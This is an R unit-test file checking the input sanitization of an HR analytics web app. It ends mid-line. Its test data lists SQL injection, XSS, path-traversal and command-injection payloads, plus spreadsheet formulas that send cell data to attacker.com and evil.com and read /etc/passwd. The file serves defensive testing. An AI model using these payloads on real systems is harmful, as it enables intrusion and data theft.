# =============================================================================
# ATLAS LABS HR ANALYTICS - COMPREHENSIVE SECURITY UNIT TESTS
# =============================================================================
# File: tests/testthat/test_security.R
# Author: akhapwoyaco
# Purpose: Extensive security testing for input validation & sanitization
# =============================================================================

library(testthat)
library(shiny)
library(DBI)
library(RSQLite)
library(stringr)
library(jsonlite)
library(xml2)

# Source the security utilities (assumes these exist in your app)
source("utils.R")
source("modules/data_loader_module.R")

# =============================================================================
# 2.1 SQL INJECTION PREVENTION TESTS
# =============================================================================

test_that("SQL Injection Prevention - Basic Attacks", {
  
  # Test basic SQL injection patterns
  sql_injection_payloads <- c(
    "'; DROP TABLE employees; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
  )
  
  for (payload in sql_injection_payloads) {
    # Test employee ID input sanitization
    result <- sanitize_employee_id(payload)
    expect_false(grepl("'", result), 
                 info = paste("Single quotes not sanitized in:", payload))
    expect_false(grepl("--", result), 
                 info = paste("SQL comments not sanitized in:", payload))
    expect_false(grepl("UNION|DROP|SELECT|INSERT|UPDATE|DELETE", 
                      result, ignore.case = TRUE),
                 info = paste("SQL keywords not sanitized in:", payload))
  }
})

test_that("SQL Injection Prevention - Advanced Attacks", {
  
  # Advanced SQL injection techniques
  advanced_payloads <- c(
    # Boolean-based blind SQL injection
    "' AND (SELECT COUNT(*) FROM employees) > 0 --",
    
    # Time-based blind SQL injection
    "'; WAITFOR DELAY '00:00:05' --",
    "' AND (SELECT SLEEP(5)) --",
    
    # Union-based SQL injection
    "' UNION ALL SELECT NULL,NULL,NULL,version(),NULL --",
    
    # Error-based SQL injection
    "' AND ExtractValue(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
    
    # Second-order SQL injection
    "O'Reilly", # Legitimate name that could cause issues
    
    # Stacked queries
    "'; INSERT INTO employees (name) VALUES ('hacker'); --",
    
    # Encoded injections
    "%27%20OR%20%271%27%3D%271", # URL encoded ' OR '1'='1
    "&#39; OR &#39;1&#39;=&#39;1", # HTML entity encoded
    
    # Database-specific injections
    "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
  )
  
  for (payload in advanced_payloads) {
    # Test against search functionality
    sanitized <- sanitize_search_input(payload)
    expect_false(contains_sql_injection(sanitized),
                 info = paste("SQL injection detected in:", payload))
    
    # Test against filter inputs
    filtered <- sanitize_filter_input(payload)
    expect_true(is_safe_input(filtered),
                info = paste("Unsafe input after filtering:", payload))
  }
})

test_that("SQL Injection Prevention - Parameterized Queries", {
  
  # Test that parameterized queries are used correctly
  test_db <- dbConnect(RSQLite::SQLite(), ":memory:")
  dbExecute(test_db, "CREATE TABLE test_employees (id INTEGER, name TEXT, email TEXT)")
  
  # Insert test data
  dbExecute(test_db, "INSERT INTO test_employees VALUES (1, 'John Doe', 'john@test.com')")
  
  # Test safe parameterized query function
  malicious_input <- "'; DROP TABLE test_employees; --"
  
  # This should use parameterized queries internally
  result <- safe_employee_lookup(test_db, malicious_input)
  
  # Verify table still exists (wasn't dropped)
  table_exists <- dbExistsTable(test_db, "test_employees")
  expect_true(table_exists, "Table was dropped - SQL injection successful!")
  
  # Verify no results returned for malicious input
  expect_equal(nrow(result), 0, "Malicious input should return no results")
  
  dbDisconnect(test_db)
})

# =============================================================================
# 2.2 XSS ATTACK PREVENTION TESTS
# =============================================================================

test_that("XSS Prevention - Reflected XSS", {
  
  # Common XSS payloads
  xss_payloads <- c(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=\"alert('XSS')\">",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>"
  )
  
  for (payload in xss_payloads) {
    # Test HTML sanitization
    sanitized <- sanitize_html_input(payload)
    expect_false(grepl("<script", sanitized, ignore.case = TRUE),
                 info = paste("Script tags not removed from:", payload))
    expect_false(grepl("javascript:", sanitized, ignore.case = TRUE),
                 info = paste("JavaScript protocol not removed from:", payload))
    expect_false(grepl("onerror|onload|onfocus|ontoggle", sanitized, ignore.case = TRUE),
                 info = paste("Event handlers not removed from:", payload))
  }
})

test_that("XSS Prevention - Stored XSS", {
  
  # Test stored XSS in employee names/comments
  stored_xss_payloads <- c(
    "John<script>alert('Stored XSS')</script>Doe",
    "Jane<img src=x onerror=alert('XSS')>Smith",
    "Employee<!--<script>alert('XSS')</script>-->Name",
    "Name\"><script>alert('XSS')</script>",
    "Name'><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>Name",
    "Name<iframe src=javascript:alert('XSS')></iframe>"
  )
  
  for (payload in stored_xss_payloads) {
    # Test employee name sanitization
    clean_name <- sanitize_employee_name(payload)
    expect_false(contains_xss(clean_name),
                 info = paste("XSS payload detected in employee name:", payload))
    
    # Test comment sanitization
    clean_comment <- sanitize_comment(payload)
    expect_false(contains_xss(clean_comment),
                 info = paste("XSS payload detected in comment:", payload))
  }
})

test_that("XSS Prevention - DOM-based XSS", {
  
  # Test JavaScript-based XSS prevention
  dom_xss_payloads <- c(
    "document.write('<script>alert(\"XSS\")</script>')",
    "eval('alert(\"XSS\")')",
    "setTimeout('alert(\"XSS\")', 100)",
    "setInterval('alert(\"XSS\")', 100)",
    "Function('alert(\"XSS\")')();",
    "window['eval']('alert(\"XSS\")')",
    "this['eval']('alert(\"XSS\")')",
    "globalThis.eval('alert(\"XSS\")')"
  )
  
  for (payload in dom_xss_payloads) {
    # Test JavaScript sanitization
    safe_js <- sanitize_javascript_input(payload)
    expect_false(grepl("eval|document\\.write|setTimeout|setInterval|Function", 
                      safe_js, ignore.case = TRUE),
                 info = paste("Dangerous JavaScript not sanitized:", payload))
  }
})

test_that("XSS Prevention - Advanced Evasion Techniques", {
  
  # Advanced XSS evasion techniques
  evasion_payloads <- c(
    # Encoding evasions
    "%3Cscript%3Ealert('XSS')%3C/script%3E", # URL encoded
    "&#60;script&#62;alert('XSS')&#60;/script&#62;", # HTML entity encoded
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", # Unicode encoded
    
    # Case variation
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    
    # Null byte injection
    "<script\x00>alert('XSS')</script>",
    
    # Tab/newline injection
    "<script\t>alert('XSS')</script>",
    "<script\n>alert('XSS')</script>",
    "<script\r>alert('XSS')</script>",
    
    # Attribute injection
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(\"XSS\")'",
    
    # CSS-based XSS
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<div style=\"background:url(javascript:alert('XSS'))\">",
    
    # SVG-based XSS
    "<svg><script>alert('XSS')</script></svg>",
    "<svg onload=\"alert('XSS')\">",
    
    # Data URI XSS
    "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
    
    # Filter bypass attempts
    "<sc<script>ript>alert('XSS')</script>",
    "<img src=\"x\" onerror=\"&#97;lert('XSS')\">"
  )
  
  for (payload in evasion_payloads) {
    # Decode and sanitize
    decoded <- decode_all_formats(payload)
    sanitized <- sanitize_html_input(decoded)
    
    expect_false(contains_xss(sanitized),
                 info = paste("XSS evasion not prevented:", payload))
    expect_false(contains_dangerous_attributes(sanitized),
                 info = paste("Dangerous attributes not removed:", payload))
  }
})

# =============================================================================
# 2.3 CSV INJECTION TESTING
# =============================================================================

test_that("CSV Injection Prevention - Formula Injection", {
  
  # CSV formula injection payloads
  csv_injection_payloads <- c(
    "=cmd|'/c calc'!A0", # Excel command execution
    "+cmd|'/c calc'!A0", # Alternative prefix
    "-cmd|'/c calc'!A0", # Alternative prefix
    "@cmd|'/c calc'!A0", # Alternative prefix
    "=1+1+cmd|'/c calc'!A0", # Calculation with command
    "=HYPERLINK(\"http://evil.com\",\"Click here\")", # Malicious hyperlink
    "=IMPORTXML(\"http://evil.com/xml\",\"//text()\")", # Data exfiltration
    "=WEBSERVICE(\"http://evil.com/\"&A1)", # Data exfiltration
    "=INDIRECT(\"A1\")", # Indirect reference
    "=CONCATENATE(\"=cmd|'/c \",\"calc'!A0\")", # Concatenated command
    "=SUM(1,9)*cmd|'/c calc'!A0", # Mathematical operation with command
    "=IF(A1>0,cmd|'/c calc'!A0,\"safe\")" # Conditional execution
  )
  
  for (payload in csv_injection_payloads) {
    # Test CSV output sanitization
    safe_output <- sanitize_csv_field(payload)
    expect_false(startsWith(safe_output, "="),
                 info = paste("Formula prefix not sanitized:", payload))
    expect_false(startsWith(safe_output, "+"),
                 info = paste("Plus prefix not sanitized:", payload))
    expect_false(startsWith(safe_output, "-"),
                 info = paste("Minus prefix not sanitized:", payload))
    expect_false(startsWith(safe_output, "@"),
                 info = paste("At prefix not sanitized:", payload))
    
    # Verify dangerous functions are removed/escaped
    expect_false(grepl("cmd|HYPERLINK|IMPORTXML|WEBSERVICE|INDIRECT", 
                      safe_output, ignore.case = TRUE),
                 info = paste("Dangerous CSV functions not sanitized:", payload))
  }
})

test_that("CSV Injection Prevention - Data Exfiltration", {
  
  # Data exfiltration attempts via CSV
  exfiltration_payloads <- c(
    "=WEBSERVICE(\"http://attacker.com/steal?data=\"&A1&A2&A3)",
    "=HYPERLINK(\"http://attacker.com/\"&CONCATENATE(A1,A2,A3),\"Legitimate Link\")",
    "=IMPORTXML(\"http://attacker.com/receive\",\"//*\")",
    "=IMPORTDATA(\"http://attacker.com/\"&A1)",
    "=IMPORTFEED(\"http://attacker.com/\"&A1)",
    "=IMPORTHTML(\"http://attacker.com/\",\"table\",1)",
    "=IMPORTRANGE(\"http://attacker.com/spreadsheet\",\"A1:Z1000\")",
    "=QUERY(IMPORTDATA(\"http://attacker.com/\"),\"SELECT *\")"
  )
  
  for (payload in exfiltration_payloads) {
    sanitized <- sanitize_csv_field(payload)
    
    # Check for HTTP/HTTPS URLs pointing to external domains
    expect_false(grepl("http://|https://", sanitized),
                 info = paste("External URLs not sanitized:", payload))
    
    # Check for data import functions
    expect_false(grepl("IMPORT|WEBSERVICE|QUERY", sanitized, ignore.case = TRUE),
                 info = paste("Data import functions not sanitized:", payload))
  }
})

test_that("CSV Injection Prevention - File System Access", {
  
  # File system access attempts
  file_access_payloads <- c(
    "=cmd|'/c type C:\\Windows\\System32\\drivers\\etc\\hosts'!A0",
    "=cmd|'/c dir C:\\'!A0",
    "=cmd|'/c cat /etc/passwd'!A0", # Linux
    "=cmd|'/c ls -la /'!A0", # Linux
    "=INDIRECT(\"file:///C:/Windows/System32/drivers/etc/hosts\")",
    "=HYPERLINK(\"file:///etc/passwd\",\"Click\")",
    "=WEBSERVICE(\"file:///C:/sensitive/data.txt\")"
  )
  
  for (payload in file_access_payloads) {
    sanitized <- sanitize_csv_field(payload)
    
    # Check for file protocol
    expect_false(grepl("file://", sanitized, ignore.case = TRUE),
                 info = paste("File protocol not sanitized:", payload))
    
    # Check for system commands
    expect_false(grepl("cmd|type|dir|cat|ls", sanitized, ignore.case = TRUE),
                 info = paste("System commands not sanitized:", payload))
    
    # Check for sensitive file paths
    expect_false(grepl("/etc/passwd|C:\\\\Windows|System32", sanitized, ignore.case = TRUE),
                 info = paste("Sensitive paths not sanitized:", payload))
  }
})

# =============================================================================
# 2.4 FILE UPLOAD VALIDATION TESTS
# =============================================================================

test_that("File Upload Validation - File Type Restrictions", {
  
  # Test allowed file types
  allowed_files <- c(
    "employees.csv",
    "performance.CSV", # Case insensitive
    "data.xlsx",
    "report.xls"
  )
  
  for (file in allowed_files) {
    expect_true(is_allowed_file_type(file),
                info = paste("Allowed file type rejected:", file))
  }
  
  # Test disallowed file types
  disallowed_files <- c(
    "malware.exe",
    "script.bat",
    "backdoor.sh",
    "virus.com",
    "trojan.scr",
    "payload.js",
    "exploit.php",
    "webshell.asp",
    "malicious.jsp",
    "dangerous.py",
    "harmful.pl",
    "evil.vbs",
    "bad.ps1",
    "config.xml", # Potentially dangerous config files
    "system.ini",
    "autorun.inf",
    "desktop.ini"
  )
  
  for (file in disallowed_files) {
    expect_false(is_allowed_file_type(file),
                 info = paste("Disallowed file type accepted:", file))
  }
})

test_that("File Upload Validation - File Size Limits", {
  
  # Test file size validation
  max_size <- 10 * 1024 * 1024 # 10MB
  
  # Valid sizes
  valid_sizes <- c(1024, 5 * 1024 * 1024, max_size)
  for (size in valid_sizes) {
    expect_true(is_valid_file_size(size, max_size),
                info = paste("Valid file size rejected:", size))
  }
  
  # Invalid sizes
  invalid_sizes <- c(max_size + 1, 50 * 1024 * 1024, 100 * 1024 * 1024)
  for (size in invalid_sizes) {
    expect_false(is_valid_file_size(size, max_size),
                 info = paste("Invalid file size accepted:", size))
  }
})

test_that("File Upload Validation - File Content Validation", {
  
  # Create temporary test files
  temp_dir <- tempdir()
  
  # Valid CSV content
  valid_csv <- file.path(temp_dir, "valid.csv")
  writeLines(c("Name,Age,Department", "John,30,IT", "Jane,25,HR"), valid_csv)
  
  expect_true(validate_csv_content(valid_csv),
              "Valid CSV content rejected")
  
  # Invalid CSV with suspicious content
  malicious_csv <- file.path(temp_dir, "malicious.csv")
  writeLines(c("Name,Command", "User,=cmd|'/c calc'!A0"), malicious_csv)
  
  expect_false(validate_csv_content(malicious_csv),
               "Malicious CSV content accepted")
  
  # Binary file masquerading as CSV
  binary_csv <- file.path(temp_dir, "binary.csv")
  writeBin(as.raw(c(0x4D, 0x5A, 0x90, 0x00)), binary_csv) # PE header
  
  expect_false(validate_csv_content(binary_csv),
               "Binary file accepted as CSV")
  
  # Cleanup
  unlink(c(valid_csv, malicious_csv, binary_csv))
})

test_that("File Upload Validation - Filename Sanitization", {
  
  # Dangerous filenames
  dangerous_filenames <- c(
    "../../../etc/passwd", # Path traversal
    "..\\..\\windows\\system32\\config\\sam", # Windows path traversal
    "file|pipe", # Pipe character
    "file>redirect", # Redirection
    "file;command", # Command separator
    "file&background", # Background execution
    "file$(command)", # Command substitution
    "file`command`", # Command substitution
    "file with spaces and (parentheses)", # Special characters
    "verylongfilenamethatexceedsthenormallimitsandcouldcausebufferoverflowissues.csv",
    "NUL", "CON", "PRN", "AUX", # Windows reserved names
    "COM1", "COM2", "LPT1", "LPT2", # Windows reserved names
    "file\x00.csv", # Null byte injection
    "file\n.csv", # Newline injection
    "file\r.csv", # Carriage return injection
    "file\t.csv", # Tab injection
    "file with unicode \u0000 chars.csv"
  )
  
  for (filename in dangerous_filenames) {
    sanitized <- sanitize_filename(filename)
    
    expect_false(grepl("\\.\\.|/|\\\\|\\||>|<|;|&|\\$|`|\\x00|\\n|\\r|\\t", 
                      sanitized),
                 info = paste("Dangerous characters not sanitized in:", filename))
    
    expect_true(nchar(sanitized) <= 255,
                info = paste("Filename not truncated:", filename))
    
    expect_false(sanitized %in% c("NUL", "CON", "PRN", "AUX", "COM1", "COM2", "LPT1", "LPT2"),
                 info = paste("Windows reserved name not handled:", filename))
  }
})

test_that("File Upload Validation - Magic Number Validation", {
  
  # Test magic number validation for different file types
  temp_dir <- tempdir()
  
  # Create files with correct magic numbers
  csv_file <- file.path(temp_dir, "test.csv")
  writeLines("col1,col2\nval1,val2", csv_file)
  expect_true(validate_file_magic_number(csv_file, "csv"))
  
  # Create file with wrong extension but correct content
  fake_exe <- file.path(temp_dir, "notavirus.exe")
  writeLines("col1,col2\nval1,val2", fake_exe)
  expect_false(validate_file_magic_number(fake_exe, "exe"))
  
  # Create CSV with suspicious binary content
  fake_csv <- file.path(temp_dir, "fake.csv")
  writeBin(c(as.raw(0x4D), as.raw(0x5A)), fake_csv) # PE header
  expect_false(validate_file_magic_number(fake_csv, "csv"))
  
  # Cleanup
  unlink(c(csv_file, fake_exe, fake_csv))
})

# =============================================================================
# 2.5 INPUT LENGTH RESTRICTIONS TESTS
# =============================================================================

test_that("Input Length Restrictions - Form Fields", {
  
  # Test various input field length limits
  field_limits <- list(
    employee_name = 100,
    employee_id = 20,
    department = 50,
    job_role = 100,
    comment = 1000,
    search_query = 200,
    filter_value = 50
  )
  
  for (field in names(field_limits)) {
    limit <- field_limits[[field]]
    
    # Test valid length
    valid_input <- paste(rep("a", limit), collapse = "")
    expect_true(validate_input_length(valid_input, field),
                info = paste("Valid length rejected for field:", field))
    
    # Test exceeding length
    invalid_input <- paste(rep("a", limit + 1), collapse = "")
    expect_false(validate_input_length(invalid_input, field),
                 info = paste("Invalid length accepted for field:", field))
    
    # Test empty input (should be valid for most fields)
    expect_true(validate_input_length("", field),
                info = paste("Empty input rejected for field:", field))
  }
})

test_that("Input Length Restrictions - Buffer Overflow Prevention", {
  
  # Test extremely long inputs that could cause buffer overflows
  buffer_overflow_tests <- c(
    paste(rep("A", 10000), collapse = ""), # 10KB
    paste(rep("B", 100000), collapse = ""), # 100KB
    paste(rep("C", 1000000), collapse = ""), # 1MB
    paste(rep("\x41", 5000), collapse = ""), # Repeated hex values
    paste(rep("\x90", 5000), collapse = "") # NOP sled pattern
  )
  
  for (input in buffer_overflow_tests) {
    # Test against all input validation functions
    expect_false(validate_employee_name(input),
                 info = "Buffer overflow input accepted in employee name")
    expect_false(validate_search_query(input),
                 info = "Buffer overflow input accepted in search query")
    expect_false(validate_comment(input),
                 info = "Buffer overflow input accepted in comment")
    
    # Ensure sanitization truncates appropriately
    sanitized <- sanitize_long_input(input)
    expect_true(nchar(sanitized) <= 1000,
                info = "Long input not properly truncated")
  }
})

test_that("Input Length Restrictions - Memory Exhaustion Prevention", {
  
  # Test inputs designed to exhaust memory
  memory_exhaustion_patterns <- list(
    # Exponential expansion patterns
    paste(rep("((((((((((", 1000), collapse = ""),
    paste(rep("{{{{{{{{{{", 1000), collapse = ""),
    paste(rep("[[[[[[[[[[", 1000), collapse = ""),
    
    # Recursive patterns
    paste(rep("<div><div><div>", 500), collapse = ""),
    paste(rep("\"\"\"\"\"\"\"\"\"\"", 500), collapse = ""),
    
    # Unicode bombing
    paste(rep("\u0001", 10000), collapse = ""),
    paste(rep("\uFEFF", 1000), collapse = "") # BOM characters
  )
  
  for (pattern in memory_exhaustion_patterns) {
    # Validate with timeout to prevent hanging
    result <- tryCatch({
      validate_input_safely(pattern, timeout = 1)
    }, error = function(e) {
      FALSE
    })
    
    expect_false(result,
                 info = "Memory exhaustion pattern not caught")
  }
})

# =============================================================================
# 2.6 SPECIAL CHARACTER HANDLING TESTS
# =============================================================================

test_that("Special Character Handling - Dangerous Characters", {
  
  # Test dangerous special characters
  dangerous_chars <- c(
    "`", "~", "!", "@", "#", "$", "%", "^", "&", "*", 
    "(", ")", "-", "+", "=", "{", "}", "[", "]", 
    "\\", "|", ";", ":", "'", "\"", "<", ">", 
    ",", ".", "?", "/", "\n", "\r", "\t", "\0"
  )
  
  base_input <- "TestInput"
  
  for (char in dangerous_chars) {
    # Test character at beginning
    test_input1 <- paste0(char, base_input)
    sanitized1 <- sanitize_special_characters(test_input1)
    
    # Test character in middle
    test_input2 <- paste0("Test", char, "Input")
    sanitized2 <- sanitize_special_characters(test_input2)
    
    # Test character at end
    test_input3 <- paste0(base_input, char)
    sanitized3 <- sanitize_special_characters(test_input3)
    
    # Verify dangerous characters are handled appropriately
    if (char %in% c("<", ">", "'", "\"", "&")) {
      # These should be HTML encoded
      expect_true(is_html_encoded(sanitized1) || !grepl(char, sanitized1, fixed = TRUE),
                  info = paste("Dangerous character not handled:", char))
    } else if (char %in% c("\n", "\r", "\t", "\0")) {
      # These should be removed or replaced
      expect_false(grepl(char, sanitized1, fixed = TRUE),
                   info = paste("Control character not removed:", char))
    }
  }
})

test_that("Special Character Handling - International Characters", {
  
  # Test international characters (should be preserved)
  international_chars <- c(
    "José María", # Spanish
    "François Müller", # French/German
    "Владимир Путин", # Cyrillic
    "田中太郎", # Japanese
    "محمد علي", # Arabic
    "राज कुマर", # Hindi
    "李小明", # Chinese
    "김철수", # Korean
    "Αλέξανδρος", # Greek
    "עברית", # Hebrew
    "Ñoño", # Spanish with tilde
    "café", # French with accent
    "naïve", # French with diaeresis
    "résumé" # French with accent
  )
  
  for (input in international_chars) {
    sanitized <- sanitize_international_input(input)
    
    # International characters should be preserved
    expect_equal(sanitized, input,
                 info = paste("International characters modified:", input))
    
    # Should still be safe for HTML output
    expect_true(is_safe_for_html(sanitized),
                info = paste("International input not safe for HTML:", input))
  }
})

test_that("Special Character Handling - Encoding Attacks", {
  
  # Test various encoding-based attacks
  encoding_attacks <- c(
    # Double URL encoding
    "%2527%2520OR%2520%25271%2527%253D%25271", # '' OR '1'='1
    
    # Mixed encoding
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
    
    # Unicode normalization attacks
    "\u003cscript\u003e", # Unicode encoded script tags
    "\uFF1Cscript\uFF1E", # Fullwidth Unicode
    
    # UTF-7 encoding
    "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-",
    
    # NULL byte variations
    "%00", "\x00", "\u0000",
    
    # Directory traversal encodings
    "%2e%2e%2f", # ../
    "%2e%2e%5c", # ..\
    "..%c0%af", # Overlong UTF-8
    "..%c1%9c" # Another overlong UTF-8
  )
  
  for (attack in encoding_attacks) {
    # Decode all possible encodings
    decoded <- decode_